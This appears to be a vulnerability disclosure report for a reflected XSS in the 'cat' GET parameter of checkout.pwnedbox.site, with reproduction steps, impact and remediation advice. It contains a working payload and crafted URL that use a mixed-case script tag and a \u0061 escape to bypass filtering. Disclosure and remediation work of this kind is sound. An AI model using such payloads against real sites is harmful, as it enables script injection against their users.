## Title
Reflected XSS - checkout.pwnedbox.site

## Description
The `cat` GET parameter on `checkout.pwnedbox.site` was found vulnerable to Reflected Cross-Site Scripting (XSS). A crafted JavaScript payload using the Unicode escape sequence `\u0061` successfully triggered an `alert(1)` dialog in the browser.

## Steps to Reproduce

1. Open the target website:
   ```text
   https://checkout.pwnedbox.site/
   ```

2. Open the following crafted URL in a browser:
   ```text
   https://checkout.pwnedbox.site/?cat=hakama%27%22%3C%3E%3CScRiPt%3E\u0061lert(1)%3C/ScRiPt%3E
   ```

3. Allow the page to load.

4. Observe the JavaScript alert dialog displaying `1`, confirming successful JavaScript execution.

5. Dismiss the alert dialog.

## POC (Proof of Concept)

**Target URL:**  
https://checkout.pwnedbox.site/

**HTTP Method:** GET

**Vulnerable Parameter:** `cat`

**Payload:**
```html
hakama'"<><ScRiPt>\u0061lert(1)</ScRiPt>
```

**Crafted Request URL:**
```text
https://checkout.pwnedbox.site/?cat=hakama%27%22%3C%3E%3CScRiPt%3E\u0061lert(1)%3C/ScRiPt%3E
```

**Observed Result:**

The supplied JavaScript payload was successfully executed through the `cat` parameter. The browser displayed a JavaScript alert dialog containing `1`, confirming Reflected Cross-Site Scripting (XSS).

**Screenshot:**

<img width="1920" height="1200" alt="image" src="https://github.com/user-attachments/assets/af2571f5-785e-4937-83e3-40f7a837f878" />


## Impact

- An attacker can craft a malicious URL and trick victims into opening it.
- Successful exploitation allows JavaScript execution in the victim's browser.
- The vulnerability may be abused for phishing or manipulation of displayed webpage content.

## Remediation

- Apply context-aware output encoding to the `cat` parameter before rendering its value in HTML.
- Validate and sanitize user-controlled input to prevent injection of executable HTML and JavaScript.
- Implement a restrictive Content Security Policy (CSP) as an additional security measure.
